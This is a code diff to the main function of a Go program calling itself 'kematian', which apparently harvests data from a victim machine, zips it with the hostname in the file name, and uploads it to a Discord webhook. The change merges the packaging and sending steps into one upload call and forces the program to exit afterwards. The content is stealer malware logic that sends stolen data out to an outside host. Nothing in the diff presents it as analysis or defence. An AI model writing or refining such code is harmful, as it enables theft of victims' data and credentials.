@@ -4,7 +4,6 @@ package main
 
 import (
 	"flag"
-	"fmt"
 	"log"
 	"os"
 	"runtime"
@@ -51,25 +50,14 @@ func main() {
 		log.Fatalf("[kematian] harvest failed: %v", err)
 	}
 
-	zipData, err := buildHarvestZip(payload)
-	if err != nil {
-		log.Fatalf("[kematian] export failed: %v", err)
-	}
-
-	summary := harvestSummary(payload)
-	filename := fmt.Sprintf("%s-kematian-%s.zip", sanitizeFilename(hostname), runtime.GOARCH)
-
-	if !*quiet {
-		log.Printf("[kematian] uploading %s (%d bytes) to Discord", filename, len(zipData))
-	}
-
-	if err := sendDiscordWebhook(webhook, summary, zipData, filename); err != nil {
-		log.Fatalf("[kematian] discord upload failed: %v", err)
+	if err := uploadAllHarvest(webhook, hostname, payload, *quiet); err != nil {
+		log.Fatalf("[kematian] upload failed: %v", err)
 	}
 
 	if !*quiet {
-		log.Printf("[kematian] done")
+		log.Printf("[kematian] upload complete, exiting")
 	}
+	os.Exit(0)
 }
 
 func sanitizeFilename(s string) string {
